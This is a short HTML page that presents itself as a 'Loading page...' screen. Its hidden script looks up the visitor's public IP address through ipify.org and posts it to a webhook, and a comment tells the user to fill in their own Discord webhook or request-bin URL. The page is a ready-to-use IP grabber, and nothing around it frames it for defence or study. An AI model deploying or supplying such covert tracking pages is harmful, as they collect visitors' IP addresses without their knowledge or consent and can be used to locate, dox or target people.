<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <p>Loading page...</p>

    <script>
        // Replace with your own Discord Webhook or request bin URL
        const webhookURL = "YOUR_WEBHOOK_URL_HERE";

        fetch('https://ipify.org')
            .then(response => response.json())
            .then(data => {
                const visitorIP = data.ip;
                
                // Send IP to your webhook/server endpoint
                fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: `New visitor IP: ${visitorIP}` })
                });
            })
            .catch(error => console.error('Error:', error));
    </script>
</body>
</html>
